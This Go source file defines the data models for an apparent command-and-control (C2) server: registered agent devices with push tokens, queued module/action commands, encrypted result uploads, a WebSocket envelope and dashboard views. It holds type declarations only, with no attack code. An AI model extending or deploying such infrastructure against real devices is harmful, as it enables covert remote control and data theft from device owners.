// Package model defines data structures for the C2 server.
package model

import (
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// DeviceInfo holds device metadata reported on registration.
type DeviceInfo struct {
	Model     string `json:"model"`
	OSVersion string `json:"os_version"`
	Arch      string `json:"arch"`
	Hostname  string `json:"hostname"`
}

// Device represents a connected agent.
type Device struct {
	ID        string          `json:"id"`
	Info      DeviceInfo      `json:"info"`
	WS        *websocket.Conn `json:"-"`
	FCMToken  string          `json:"fcm_token,omitempty"`
	LastSeen  time.Time       `json:"last_seen"`
	Online    bool            `json:"online"`
	Queue     []Command       `json:"-"`
	mu        sync.Mutex
}

// Lock acquires the device mutex.
func (d *Device) Lock()   { d.mu.Lock() }

// Unlock releases the device mutex.
func (d *Device) Unlock() { d.mu.Unlock() }

// Command represents a C2 command queued for a device.
type Command struct {
	ID       string                 `json:"id"`
	DeviceID string                 `json:"device_id"`
	Module   string                 `json:"module"`
	Action   string                 `json:"action"`
	Params   map[string]interface{} `json:"params,omitempty"`
	Time     time.Time              `json:"time"`
}

// CommandRequest is the JSON body for POST /api/command.
type CommandRequest struct {
	DeviceID string                 `json:"device_id"`
	Module   string                 `json:"module"`
	Action   string                 `json:"action"`
	Params   map[string]interface{} `json:"params,omitempty"`
}

// ResultRequest is the JSON body for POST /api/result.
type ResultRequest struct {
	DeviceID string `json:"device_id"`
	CommandID string `json:"command_id,omitempty"`
	Data     string `json:"data"` // base64-encoded encrypted result
}

// FCMRegisterRequest is the JSON body for POST /api/register-fcm.
type FCMRegisterRequest struct {
	DeviceID string `json:"device_id"`
	Token    string `json:"token"`
}

// WSMessage is the JSON envelope for WebSocket communication.
type WSMessage struct {
	Type      string                 `json:"type"`
	DeviceID  string                 `json:"device_id,omitempty"`
	CommandID string                 `json:"command_id,omitempty"`
	Module    string                 `json:"module,omitempty"`
	Action    string                 `json:"action,omitempty"`
	Params    map[string]interface{} `json:"params,omitempty"`
	Data      string                 `json:"data,omitempty"`
	Info      *DeviceInfo            `json:"info,omitempty"`
	Error     string                 `json:"error,omitempty"`
}

// DashboardDevice is a sanitized version for the dashboard API.
type DashboardDevice struct {
	ID       string     `json:"id"`
	Info     DeviceInfo `json:"info"`
	LastSeen time.Time  `json:"last_seen"`
	Online   bool       `json:"online"`
	HasFCM   bool       `json:"has_fcm"`
}

// DashboardResult holds a decrypted result for the dashboard broadcast.
type DashboardResult struct {
	DeviceID  string `json:"device_id"`
	CommandID string `json:"command_id,omitempty"`
	Module    string `json:"module,omitempty"`
	Action    string `json:"action,omitempty"`
	Data      string `json:"data"`
	Time      string `json:"time"`
}

// HealthResponse is the JSON body for GET /api/health.
type HealthResponse struct {
	Status       string `json:"status"`
	DeviceCount  int    `json:"device_count"`
	OnlineCount  int    `json:"online_count"`
	Uptime       string `json:"uptime"`
}
